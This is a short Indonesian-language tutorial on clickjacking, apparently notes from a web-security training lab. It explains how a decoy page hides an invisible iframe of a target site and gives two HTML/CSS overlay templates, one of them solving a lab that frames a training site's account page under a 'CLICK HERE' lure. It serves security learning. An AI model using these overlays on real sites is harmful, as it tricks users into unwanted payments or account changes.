
## Apa itu clickjacking?

Clickjacking adalah serangan berbasis antarmuka di mana pengguna ditipu untuk mengeklik konten yang dapat ditindaklanjuti di situs web tersembunyi dengan mengeklik beberapa konten lain di situs web umpan. Perhatikan contoh berikut:

Seorang pengguna web mengakses situs web umpan (mungkin ini adalah tautan yang disediakan melalui email) dan mengklik tombol untuk memenangkan hadiah. Tanpa sadar, mereka telah ditipu oleh penyerang untuk menekan tombol alternatif yang tersembunyi dan ini mengakibatkan pembayaran akun di situs lain. Ini adalah contoh serangan clickjacking. Teknik ini bergantung pada penggabungan halaman web yang tidak terlihat dan dapat ditindaklanjuti (atau beberapa halaman) yang berisi tombol atau tautan tersembunyi, misalnya, dalam iframe. Iframe dihamparkan di atas konten halaman web umpan yang diantisipasi pengguna. Serangan ini berbeda dari serangan CSRF di mana pengguna diharuskan melakukan tindakan seperti mengklik tombol sedangkan serangan CSRF bergantung pada pemalsuan seluruh permintaan tanpa sepengetahuan atau masukan pengguna.![[clickjacking-infographic.svg]]

## Bagaimana membangun serangan dasar clickjacking

Serangan clickjacking menggunakan CSS untuk membuat dan memanipulasi lapisan. Penyerang memasukkan situs web target sebagai lapisan iframe yang dilapiskan pada situs web umpan. Contoh penggunaan tag style dan parameternya adalah sebagai berikut:

```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 128px;
      height: 128px;
      opacity: 0.00001;
      z-index: 2;
    }

    #decoy_website {
      position: absolute;
      width: 300px;
      height: 400px;
      z-index: 1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    ...decoy web content here...
  </div>

  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```

## Lab: Basic clickjacking with CSRF token protection

```html
<head>
   <style>
      iframe {
       position:relative;
       width:700px;
       height:600px;
       opacity:0.1;
       z-index:2;
      }
      div {
       position:absolute;
       z-index:1;
       top:500px;
       left:50px;
      }
   </style>
</head>
<body>
   <div>
      CLICK HERE
   </div>
   <iframe src="0a0d001804f0d0f9804a67f800ef0002.web-security-academy.net/my-account">
   </iframe>
</body>
```


